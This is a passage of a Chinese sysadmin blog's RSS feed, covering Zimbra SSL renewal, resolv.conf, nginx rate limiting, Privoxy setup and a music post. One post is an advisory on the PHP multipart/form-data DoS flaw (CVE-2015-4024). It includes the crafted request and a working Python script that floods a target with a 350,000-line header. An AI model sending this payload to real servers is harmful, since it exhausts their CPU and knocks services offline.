&lt;li&gt;&lt;code&gt;Type&lt;/code&gt; - The memory module&amp;rsquo;s type.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;解决问题&#34;&gt;解决问题&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;上面的配置中，发现是可以配置内存位置的。&lt;/li&gt;
&lt;li&gt;拆了主机，发现这台主机内存插在第二根插槽上，也就是第1槽。按正常的开机顺序，应该是先去引导第0槽，默认是离CPU最近的那根槽。&lt;/li&gt;
&lt;li&gt;抱着怀疑的态度把内存换到了第0槽，开机。&lt;/li&gt;
&lt;li&gt;卧槽，真的可以了！&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>【Zimbra】更换邮箱SSL证书</title>
      <link>http://inorz.net/2015/11/05/zimbra-change-ssl/</link>
      <pubDate>Thu, 05 Nov 2015 20:05:48 +0000</pubDate>
      
      <guid>http://inorz.net/2015/11/05/zimbra-change-ssl/</guid>
      <description>&lt;p&gt;有台用zimbra部署的邮箱服务器证书马上到期了，之前用的StartSSL突然抽风，不知为何不能申请证书了。于是临时换用了沃通的免费证书来应急一下。
　　中间遇到了些困难，主要是被网上搜索的一些文章给误导了，失败了无数次。
　　记录下更换过程。&lt;/p&gt;

&lt;h3 id=&#34;申请证书&#34;&gt;申请证书&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;先到沃通官网申请证书&lt;a href=&#34;https://buy.wosign.com/free/#ssl&#34;&gt;点此跳转&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;按上面的要求一步步申请完证书&lt;/li&gt;
&lt;li&gt;证书下载回来后,打开文件选择解压for Other Apache.zip, 其中有3个文件:
&amp;gt; 根证书：1_root_bundle.crt
&amp;gt; 公钥证书：2_domain.com.crt
&amp;gt; 私钥：3_domain.com.key&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h3 id=&#34;替换证书&#34;&gt;替换证书&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;把上面解压出来的三个文件上传到服务器&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.wosign.com/root/startcom.crt&#34;&gt;下载&lt;/a&gt; 顶级根证书,然后把顶级根证书的内容加到公钥证书中&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat startcom.crt &amp;gt;&amp;gt; 2_domain.com.crt
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;替换服务器上旧的私钥文件&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mv /opt/zimbra/ssl/zimbra/commercial/commercial.key /data/backup/commercial.key.${RANDOM}
cp 3_domain.com.key /opt/zimbra/ssl/zimbra/commercial/commercial.key
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;校验证书&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/opt/zimbra/bin/zmcertmgr verifycrt comm /opt/zimbra/ssl/zimbra/commercial/commercial.key 2_domain.com.crt 1_root_bundle.crt
    
# 校验成功会有这样的提示
** Verifying 2_domain.com.crt against /opt/zimbra/ssl/zimbra/commercial/commercial.key
Certificate (2_domain.com.crt) and private key (/opt/zimbra/ssl/zimbra/commercial/commercial.key) match.
Valid Certificate: 2_domain.com.crt: OK
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;更新证书&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/opt/zimbra/bin/zmcertmgr deploycrt comm 2_domain.com.crt 1_root_bundle.crt
    
# 更新成功会有这样的提示
** Verifying 2_domain.com.crt against /opt/zimbra/ssl/zimbra/commercial/commercial.key
Certificate (2_domain.com.crt) and private key (/opt/zimbra/ssl/zimbra/commercial/commercial.key) match.
Valid Certificate: 2_domain.com.crt: OK
** Copying 2_domain.com.crt to /opt/zimbra/ssl/zimbra/commercial/commercial.crt
** Appending ca chain 1_root_bundle.crt to /opt/zimbra/ssl/zimbra/commercial/commercial.crt
** Importing certificate /opt/zimbra/ssl/zimbra/commercial/commercial_ca.crt to CACERTS as zcs-user-commercial_ca...done.
** NOTE: mailboxd must be restarted in order to use the imported certificate.
** Saving server config key zimbraSSLCertificate...done.
** Saving server config key zimbraSSLPrivateKey...done.
** Installing mta certificate and key...done.
** Installing slapd certificate and key...done.
** Installing proxy certificate and key...done.
** Creating pkcs12 file /opt/zimbra/ssl/zimbra/jetty.pkcs12...done.
** Creating keystore file /opt/zimbra/mailboxd/etc/keystore...done.
** Installing CA to /opt/zimbra/conf/ca...done.
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;重启zmcontrol&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;su - zimbra
zmcontrol restart
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;重启完了后重启登录页面,可以看到邮箱证书已经替换成功&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>【DNS】resolv.conf配置说明[转]</title>
      <link>http://inorz.net/2015/09/06/resolv/</link>
      <pubDate>Sun, 06 Sep 2015 12:05:48 +0000</pubDate>
      
      <guid>http://inorz.net/2015/09/06/resolv/</guid>
      <description>&lt;p&gt;对这个一开始是一种半解的，看了&lt;a href=&#34;http://www.lnmpy.com/resolv.conf-search-domain/&#34;&gt;这篇文章&lt;/a&gt;后觉得有用，就转了过来记录一下。&lt;/p&gt;

&lt;h3 id=&#34;配置说明&#34;&gt;配置说明&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&amp;ldquo;nameserver&amp;rdquo; 指定要进行域名解析的dnsserver的IP地址。可以定义多个IP地址，按照顺序来请求&lt;/li&gt;
&lt;li&gt;&amp;ldquo;domain&amp;rdquo; 指定本地的domain，如果查询时的域名没有包含&amp;rdquo;.&amp;ldquo;，则会在此后面加上domain的值来进行解析&lt;/li&gt;
&lt;li&gt;&amp;ldquo;search&amp;rdquo; 若搜索的域名没有找到，则将域名拼接上search来搜索。下面会有例子来说明。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;/p&gt;

&lt;p&gt;现实中有&amp;rdquo;qh.inorz.net&amp;rdquo;，下面就以这个来说明，主要是说明&amp;rdquo;domain&amp;rdquo;和&amp;rdquo;search&amp;rdquo;的意义。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat /etc/resolv.conf

########
nameserver 192.168.1.1
nameserver 8.8.8.8
domain  inorz.net
search  baidu.com inorz.net.cn
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;测试&#34;&gt;测试&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ping inorz.net
&amp;gt; 这里是直接走的 nameserver&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ping qh
&amp;gt; 按顺序查找 qh, qh.inorz.net, qh.baidu.com 和 qh.inorz.net.cn
&amp;gt; 这里的顺序是nameserver -&amp;gt; domain -&amp;gt; search&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ping qh.inorz
&amp;gt; 此处就只查找 qh.inorz，qh.inorz.inorz.net 和 qh.inorz.baidu.com
&amp;gt; 这里的顺序是nameserver -&amp;gt; domain -&amp;gt; search
&amp;gt; domain此时没有起到作用，因为其定义是当搜索的domain没有&amp;rdquo;.&amp;ldquo;时，则优先搜索domain，否则跳过&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>使用nginx的limit模块限制并发</title>
      <link>http://inorz.net/2015/08/19/nginx-module-limit/</link>
      <pubDate>Wed, 19 Aug 2015 22:15:48 +0000</pubDate>
      
      <guid>http://inorz.net/2015/08/19/nginx-module-limit/</guid>
      <description>&lt;h2 id=&#34;遇到的问题&#34;&gt;【遇到的问题】&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;当前系统被高强度频繁的调用API&lt;/li&gt;
&lt;li&gt;当前系统API经常被各种扫描请求&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;如何解决&#34;&gt;【如何解决】&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;使用nginx的limit模块限制并发&lt;/li&gt;
&lt;li&gt;只限制部分地址或是只限制部分IP（白名单或黑名单）&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;配置方法&#34;&gt;【配置方法】&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;vi nginx/conf/limit/black_ip.conf&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.8.xxx 1;
192.168.8.xxx 1;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;vi nginx/conf/limit/limit_zone.conf&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;geo $blackiplist  {
  default 0;
  include limit/black_ip.conf;
}
        
map $blackiplist $limit {
  1 $binary_remote_addr;
  0 &amp;quot;&amp;quot;;
}
        
limit_req_zone $limit zone=perreq:100m rate=3000r/s;     #黑名单内的IP每秒最多处理 3000 个请求
limit_conn_zone $limit zone=perip:100m; 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;vi nginx/conf/limit/limit_location.conf&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;limit_conn perip 3000;        # 黑名单的IP,每个IP最大并发为2000
limit_req zone=perreq nodelay;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;修改 &lt;code&gt;nginx/conf/nginx.conf&lt;/code&gt;，http { &amp;hellip; } 区域添加下面配置：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;include limit/limit_zone.conf;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;最后在需要限制的虚拟主机里，对应要限制的路径下面添加配置用于限制。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;include limit/limit_location.conf;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;配置说明&#34;&gt;【配置说明】&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;里面使用到了 geo指令定义黑名单 \$blackiplist 的变量，默认值为0，如果客户端IP在上面的范围内，\$blackiplist 的值为1&lt;/li&gt;
&lt;li&gt;使用map指令映射【黑名单里IP】显示为真实的IP，如果不是黑名单里的IP就为空，这样【除了黑名单里的IP】都不能存到limit_req_zone内存session中，所以不会限制黑名单之外的ip访问&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>See you Again</title>
      <link>http://inorz.net/2015/05/24/see-you-again/</link>
      <pubDate>Sun, 24 May 2015 14:35:48 +0000</pubDate>
      
      <guid>http://inorz.net/2015/05/24/see-you-again/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;看过速度7的朋友一定会对这首see you again印象非常深刻。这里找了几个版本的歌曲，可以一饱耳福了。
废话不多说了，下面的视频献上。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h3 id=&#34;粤语版&#34;&gt;【粤语版】&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;embed src=&#34;http://player.youku.com/player.php/sid/XOTYyMTUxNzY4/v.swf&#34; allowFullScreen=&#34;true&#34; quality=&#34;high&#34; width=&#34;480&#34; height=&#34;400&#34; align=&#34;middle&#34; allowScriptAccess=&#34;always&#34; type=&#34;application/x-shockwave-flash&#34;&gt;&lt;/embed&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;中文版&#34;&gt;【中文版】&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;embed src=&#34;http://player.youku.com/player.php/sid/XOTQ3MDU3NzI0/v.swf&#34; allowFullScreen=&#34;true&#34; quality=&#34;high&#34; width=&#34;480&#34; height=&#34;400&#34; align=&#34;middle&#34; allowScriptAccess=&#34;always&#34; type=&#34;application/x-shockwave-flash&#34;&gt;&lt;/embed&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;再来个原版&#34;&gt;【再来个原版】&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;embed src=&#34;http://player.youku.com/player.php/sid/XOTI5NDM0MDk2/v.swf&#34; allowFullScreen=&#34;true&#34; quality=&#34;high&#34; width=&#34;480&#34; height=&#34;400&#34; align=&#34;middle&#34; allowScriptAccess=&#34;always&#34; type=&#34;application/x-shockwave-flash&#34;&gt;&lt;/embed&gt;&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    
    <item>
      <title>Centos下Privoxy的安装与配置</title>
      <link>http://inorz.net/2015/05/24/init-privoxy-to-centos/</link>
      <pubDate>Sun, 24 May 2015 13:25:48 +0000</pubDate>
      
      <guid>http://inorz.net/2015/05/24/init-privoxy-to-centos/</guid>
      <description>&lt;h3 id=&#34;一-背景&#34;&gt;一、【背景】&lt;/h3&gt;

&lt;p&gt;　　手上有墙外的VPS可用，部署了shadowsocks（以下简称ss），从墙外使用rsync拉文件或是IOS（未越狱）想出墙时。都比较麻烦。于是看上了Privoxy这货。可以把socks5转换为HTTP代理，也就是俗称的APN。&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;步骤如下：&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;国外VPS机器分别安装ss服务端和客户端&lt;/li&gt;
&lt;li&gt;客户端直接连本机服务端&lt;/li&gt;
&lt;li&gt;部署Privoxy将ss客户端生成的sock5代理转成HTTP代理&lt;/li&gt;
&lt;li&gt;rsync或IOS端直接连接国外VPS上的HTTP代理。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;PS：如果手头还有国内VPS的话最好是客户端和Privoxy都在国内VPS上。代理这块就比较少被检验。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;/p&gt;

&lt;p&gt;　　ss的安装和配置这里就不叙述了，因为过程和配置比较简单。这篇主要还是说说负责 Privoxy 安装与设置吧。&lt;/p&gt;

&lt;h3 id=&#34;二-安装&#34;&gt;二、【安装】&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Privoxy 是一个轻量级的代理服务，不需要大量的内存进行缓存，是开源项目，官方介绍如下：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Privoxy是一款带过滤功能的代理服务器，针对HTTP、HTTPS协议，经常跟Tor组合使用。通过Privoxy的超级过滤功能，用户从而可以保护隐私、对网页内容进行过滤、管理cookies，以及拦阻各种广告等。Privoxy可以用作单机，也可以应用到多用户的网络。&lt;/p&gt;
&lt;/blockquote&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;你可以在 &lt;a href=&#34;http://sourceforge.net/projects/ijbswa/files/&#34;&gt;这里&lt;/a&gt; 选择适合你的版本，目前基本可以算常用桌面全版本（Unix众，Win，MacOS）。这里我选择了源码安装的方式。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 添加一个用户给 Privoxy
echo &#39;privoxy:*:7777:7777:privoxy proxy:/no/home:/no/shell&#39; &amp;gt;&amp;gt; /etc/passwd
# 分配个组给 Privoxy
echo &#39;privoxy:*:7777:&#39; &amp;gt;&amp;gt; /etc/group
# 开始编译安装...
autoheader
autoconf
./configure      # (--help to see options)
make             # (the make from GNU, sometimes called gmake)
make -s install  # (to really install, -s to silence output)
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;默认安装后相应的配置在 /usr/local/etc/privoxy 目录下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 运行
/etc/init.d/privoxy start
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;三-定制&#34;&gt;三、【定制】&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;根据我们的需求来定制一下配置（将ss的sock5转换为HTTP代理），加上用户密码。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;配置HTTP代理端口&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;vi /usr/local/etc/privoxy/config
#找到listen-address，配置HTTP代理的端口
listen-address  127.0.0.1:31904
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;向对应端口转发&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;vi /usr/local/etc/privoxy/config
# 找到forward-socks5，配置要转发的端口，及特地规则。具体使用场景可以参考官方配置里写上。
# 这里我们配置全局转发，目前是49879端口(ss客户端)
forward-socks5t   /         127.0.0.1:49879 .
    
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;配置用户名和密码（如果做了防火墙只允许内部IP访问，或是免费开放给大家使用。可以无视这条）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 生成用户名和密码对应的base64密文
perl -e &amp;quot;use MIME::Base64; print encode_base64(&#39;用户名:密码&#39;);&amp;quot;
    
# 修改config文件，添加actionsfile user.action，编辑 user.action 文件中的 alias
proxy = +forward-override{forward 127.0.0.1:808} +add-header{Proxy-authorization: Basic &amp;lt;auth&amp;gt;}
    
# 也可以IP段过滤, 打开配置，找到 permit-access,里面有对应的配置模板。
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;配置完了，重启下privoxy&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/etc/init.d/privoxy restart
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;四-如何使用http代理&#34;&gt;四、【如何使用HTTP代理】&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;RSYNC代理&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export RSYNC_PROXY=&#39;IP:PORT&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;IOS上使用
&amp;gt; 设置-WIFI-点中你连接的WIFI旁边的(i)进入WIFI设置-最下方HTTP代理-输入对应信息&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;五-faq&#34;&gt;五、【FAQ】&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;按上面的配置好了，还是连接不上
PS：检查一下端口和防火墙有没有添加上对应的规则&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;欢迎补充。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>【安全】PHP Multipartform-data 远程DOS攻击漏洞</title>
      <link>http://inorz.net/2015/05/21/php-multipartform-data/</link>
      <pubDate>Thu, 21 May 2015 14:45:48 +0000</pubDate>
      
      <guid>http://inorz.net/2015/05/21/php-multipartform-data/</guid>
      <description>&lt;h3 id=&#34;漏洞摘要&#34;&gt;【漏洞摘要】&lt;/h3&gt;

&lt;p&gt;　　PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。
 　　&lt;/p&gt;

&lt;h3 id=&#34;影响范围&#34;&gt;【影响范围】&lt;/h3&gt;

&lt;p&gt;　　PHP所有版本&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h3 id=&#34;解决方案&#34;&gt;【解决方案】&lt;/h3&gt;

&lt;p&gt;　　1. 5.2.17 ：&lt;a href=&#34;https://coding.net/u/simapple/p/oldphppatch/git/blob/master/CVE-ID2015-4024/php5.2patch&#34;&gt;一个民间的补丁&lt;/a&gt;
　　2. 5.4.X 直接升级到最新的5.4.41&lt;/p&gt;

&lt;h3 id=&#34;漏洞入口&#34;&gt;【漏洞入口】&lt;/h3&gt;

&lt;p&gt;　　PHP源码中main/ rfc1867.c负责解析multipart/form-data协议，DOS漏洞出现在main/rfc46675pxultipart_buffer_headers函数。
　　在详细分析漏洞函数前，先分析进入漏洞函数的路径。PHP解析multipart/form-data http请求体的入口函数在SAPI_POST_HANDLER_FUNC(rfc1867.c中的函数)，代码如下。SAPI_POST_HANDLER_FUNC函数首先解析请求的boundary。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* Get the boundary */
boundary= strstr(content_type_dup, &amp;quot;boundary&amp;quot;);
 if(!boundary) {
     intcontent_type_len = strlen(content_type_dup);
     char*content_type_lcase = estrndup(content_type_dup, content_type_len);

     php_strtolower(content_type_lcase,content_type_len);
     boundary= strstr(content_type_lcase, &amp;quot;boundary&amp;quot;);
     if(boundary) {
             boundary= content_type_dup + (boundary - content_type_lcase);
     }
     efree(content_type_lcase);
  }
  if(!boundary || !(boundary = strchr(boundary, &#39;=&#39;))) {
       sapi_module.sapi_error(E_WARNING,&amp;quot;Missing boundary in multipart/form-data POST data&amp;quot;);
       return;
   }
   boundary++;
   boundary_len= strlen(boundary);
   …
   …
   while(!multipart_buffer_eof(mbuff TSRMLS_CC))
   {
                   charbuff[FILLUNIT];
                   char*cd = NULL, *param = NULL, *filename = NULL, *tmp = NULL;
                   size_tblen = 0, wlen = 0;
                   off_toffset;

                   zend_llist_clean(&amp;amp;header);

                   if(!multipart_buffer_headers(mbuff, &amp;amp;header TSRMLS_CC)) {
                            gotofileupload_done;
                   }

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;漏洞原理&#34;&gt;【漏洞原理】&lt;/h3&gt;

&lt;p&gt;　　在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符&amp;rsquo;:&amp;lsquo;，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块。该代码块进行1次内存分配，2次内存拷贝，1次内存释放。当value值越来越长，将消耗大量的cpu时间。如果以拷贝一个字节为时间复杂度单位，value的长度为m，时间复杂度为m*m.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;prev_len= strlen(prev_entry.value);
     cur_len= strlen(line);

     entry.value= emalloc(prev_len + cur_len + 1); //1次分片内存
     memcpy(entry.value,prev_entry.value, prev_len); //1次拷贝
     memcpy(entry.value+ prev_len, line, cur_len);   //1次拷贝
     entry.value[cur_len+ prev_len] = &#39;\0&#39;;

     entry.key= estrdup(prev_entry.key);

     zend_llist_remove_tail(header);//1次内存释放
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;漏洞利用&#34;&gt;【漏洞利用】&lt;/h3&gt;

&lt;p&gt;　　构造像以下恶意的http请求，当存在350000行a\n时，在我的测试环境中，一个http请求将消耗10s的cpu时间。每隔若干秒，同时并发多个请求，将导致server端cpu资源长期耗尽，从而到达DOS。总的来说，利用方式和Hash Collision DOS一样。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;------WebKitFormBoundarypE33TmSNWwsMphqz
Content-Disposition:form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;s
a
a
a
…
…
…
a&amp;quot;
Content-Type:application/octet-stream

why is it?
------WebKitFormBoundarypE33TmSNWwsMphqz
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;漏洞测试&#34;&gt;【漏洞测试】&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&#39;&#39;&#39;
Author: Shusheng Liu,The Department of Security Cloud, Baidu
email: liusscs@163.com
/* &amp;lt;![CDATA[ */!function(){try{var t=&amp;quot;currentScript&amp;quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&amp;quot;script&amp;quot;),e=t.length;e--;)if(t[e].getAttribute(&amp;quot;cf-hash&amp;quot;))return t[e]}();if(t&amp;amp;&amp;amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&amp;quot;data-cfemail&amp;quot;);if(a){for(e=&amp;quot;&amp;quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&amp;gt; */
&#39;&#39;&#39;
import sys
import urllib,urllib2
import datetime
from optparse import OptionParser

def http_proxy(proxy_url):

    proxy_handler = urllib2.ProxyHandler({&amp;quot;http&amp;quot; : proxy_url})
    null_proxy_handler = urllib2.ProxyHandler({})
    opener = urllib2.build_opener(proxy_handler)
    urllib2.install_opener(opener)
#end http_proxy

def check_php_multipartform_dos(url,post_body,headers):
    req = urllib2.Request(url)
    for key in headers.keys():
        req.add_header(key,headers[key])
    starttime = datetime.datetime.now();
    fd = urllib2.urlopen(req,post_body)
    html = fd.read()
    endtime = datetime.datetime.now()
    usetime=(endtime - starttime).seconds
    if(usetime &amp;gt; 5):
        result = url+&amp;quot; is vulnerable&amp;quot;;
    else:
        if(usetime &amp;gt; 3):
            result = &amp;quot;need to check normal respond time&amp;quot;
    return [result,usetime]
#end


def main():
    #http_proxy(&amp;quot;http://127.0.0.1:8089&amp;quot;)
    parser = OptionParser()
    parser.add_option(&amp;quot;-t&amp;quot;, &amp;quot;--target&amp;quot;, action=&amp;quot;store&amp;quot;,
                  dest=&amp;quot;target&amp;quot;,
                  default=False,
          type=&amp;quot;string&amp;quot;,
                  help=&amp;quot;test target&amp;quot;)
    (options, args) = parser.parse_args()
    if(options.target):
    target = options.target
    else:
    return;

    Num=350000
    headers={&#39;Content-Type&#39;:&#39;multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1&#39;,
            &#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;,
            &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36&#39;}
    body = &amp;quot;------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\&amp;quot;file\&amp;quot;; filename=sp.jpg&amp;quot;
    payload=&amp;quot;&amp;quot;
    for i in range(0,Num):
        payload = payload + &amp;quot;a\n&amp;quot;
    body = body + payload;
    body = body + &amp;quot;Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--&amp;quot;
    print &amp;quot;starting...&amp;quot;;
    respond=check_php_multipartform_dos(target,body,headers)
    print &amp;quot;Result : &amp;quot;
    print respond[0]
    print &amp;quot;Respond time : &amp;quot;+str(respond[1]) + &amp;quot; seconds&amp;quot;;

if __name__==&amp;quot;__main__&amp;quot;:
    main()
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;参考&#34;&gt;【参考】&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://bugs.php.net/bug.php?id=69364&#34;&gt;https://bugs.php.net/bug.php?id=69364&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://php.net/ChangeLog-5.php#5.5.25&#34;&gt;http://php.net/ChangeLog-5.php#5.5.25&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://drops.wooyun.org/papers/6077&#34;&gt;http://drops.wooyun.org/papers/6077&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>解决MAC打包压缩文件在Windows下乱码</title>
      <link>http://inorz.net/2015/05/20/mac-dabao-luanma-windows/</link>
      <pubDate>Wed, 20 May 2015 23:45:48 +0000</pubDate>
      
      <guid>http://inorz.net/2015/05/20/mac-dabao-luanma-windows/</guid>
      <description>&lt;h3 id=&#34;问题&#34;&gt;【问题】&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;用Mac自带的归档程序打包的zip，发到windows端，显示会乱码。里面对应的文件夹的文件目录也发生变化&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;原因&#34;&gt;【原因】&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;是文件编码的问题，Mac 下默认是UTF-8，windows下默认为GBK&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h3 id=&#34;解决&#34;&gt;【解决】&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;在Windows上用新版WinRAR(5.0) 以上版本直接解压即可&lt;/li&gt;
&lt;li&gt;用第三方打包软件Keka(开源、免费)，打包成.7z&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;keka下载&#34;&gt;【Keka下载】：&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Keka: &lt;a href=&#34;http://www.kekaosx.com/zh-cn/&#34;&gt;http://www.kekaosx.com/zh-cn/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;注意&#34;&gt;【注意】&lt;/h3&gt;

&lt;ol&gt;
